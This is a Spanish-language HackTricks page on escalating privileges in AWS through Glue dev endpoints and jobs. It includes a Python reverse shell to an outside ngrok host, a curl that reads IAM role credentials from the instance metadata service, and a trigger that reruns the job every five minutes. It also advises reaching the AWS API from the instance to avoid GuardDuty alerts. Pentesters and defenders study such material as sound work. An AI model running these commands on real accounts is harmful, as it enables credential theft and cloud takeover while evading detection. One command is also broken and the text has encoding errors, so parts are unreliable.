# AWS - Glue Privesc

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## glue

### `iam:PassRole`, `glue:CreateDevEndpoint`, (`glue:GetDevEndpoint` | `glue:GetDevEndpoints`)

Un atacante con los permisos `iam:PassRole` y `glue:CreateDevEndpoint` podr√≠a **crear un nuevo punto de enlace de desarrollo de AWS Glue y pasarle un rol de servicio existente**. Luego, podr√≠an conectarse por SSH al instante y usar la CLI de AWS para tener acceso a los permisos a los que tiene acceso el rol.

```
aws glue create-dev-endpoint --endpoint-name my_dev_endpoint \
    --role-arn arn_of_glue_service_role \
    --public-key file:///path/to/my/public/ssh/key.pub
```

Ahora, el atacante solo necesitar√≠a **conectarse por SSH al punto de enlace de desarrollo** para acceder a las credenciales de los roles.

```bash
# Obtener la direcci√≥n p√∫blica de la instancia
## Tambi√©n se puede usar get-dev-endpoints
aws glue get-dev-endpoint --endpoint-name privesctest

# Con√©ctese con el usuario de pegamento
ssh -i /tmp/private.key ec2-54-72-118-58.eu-west-1.compute.amazonaws.com
```

Aunque no se especifica espec√≠ficamente en la documentaci√≥n de GuardDuty, ser√≠a una mala idea exfiltrar las credenciales del Instance de Glue. En su lugar, **se debe acceder directamente a la API de AWS desde la nueva instancia**.

**Impacto potencial:** Privesc al rol de servicio de pegamento especificado.

### `glue:UpdateDevEndpoint`, (`glue:GetDevEndpoint` | `glue:GetDevEndpoints`)

Un atacante con el permiso **`glue:UpdateDevEndpoint`** podr√≠a **actualizar la clave p√∫blica SSH asociada de un punto de enlace de desarrollo de Glue existente**, para luego conectarse por SSH y tener acceso a los permisos a los que tiene acceso el rol adjunto.

```bash
# Cambiar la clave p√∫blica para conectarse
aws glue --endpoint-name target_endpoint \
    --public-key file:///path/to/my/public/ssh/key.pub

# Obtener la direcci√≥n p√∫blica de la instancia
## Tambi√©n se puede usar get-dev-endpoints
aws glue get-dev-endpoint --endpoint-name privesctest

# Con√©ctese con el usuario de pegamento
ssh -i /tmp/private.key ec2-54-72-118-58.eu-west-1.compute.amazonaws.com
```

Ahora, el atacante solo necesitar√≠a **conectarse por SSH al punto de enlace de desarrollo para acceder a las credenciales de los roles**. Se debe acceder directamente a la API de AWS desde la nueva instancia para evitar activar alertas.

**Impacto potencial:** Privesc al rol de servicio de pegamento utilizado.

### `iam:PassRole`, (`glue:CreateJob` | `glue:UpdateJob`), (`glue:StartJobRun` | `glue:CreateTrigger`)

Un atacante con esos permisos puede **crear/actualizar un trabajo adjuntando cualquier cuenta de servicio de pegamento** y iniciarlo. El trabajo puede ejecutar c√≥digo Python arbitrario, por lo que se puede obtener una shell inversa y usarla para **robar las credenciales IAM** del rol adjunto.

```bash
# Contenido del script de Python guardado en s3:
#import socket,subprocess,os
#s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#s.connect(("2.tcp.ngrok.io",11216))
#os.dup2(s.fileno(),0)
#os.dup2(s.fileno(),1)
#os.dup2(s.fileno(),2)
#p=subprocess.call(["/bin/sh","-i"])
#Para obtener las credenciales de IAM Role, ejecute: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy


# Se cre√≥ un rol de Glue con acceso de administrador
aws glue create-job \
    --name privesctest \
    --role arn:aws:iam::93424712358:role/GlueAdmin \
    --command '{"Name":"pythonshell", "PythonVersion": "3", "ScriptLocation":"s3://airflow2123/rev.py"}'

# Puede iniciar directamente el trabajo
aws glue start-job-run --job-name privesctest
# O puede crear un desencadenador para iniciarlo
aws glue create-trigger --name triggerprivesc --type SCHEDULED \
    --actions '[{"JobName": "privesctest"}]' --start-on-creation \
    --schedule "0/5 * * * * *"  #Cada 5 minutos, si√©ntete libre de cambiar
```

**Impacto potencial:** Privesc al rol de servicio de pegamento especificado.

### `glue:UpdateJob`

Solo con el permiso de actualizaci√≥n, un atacante podr√≠a robar las credenciales IAM del rol ya adjunto.

**Impacto potencial:** Privesc al rol de servicio de pegamento adjunto.

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>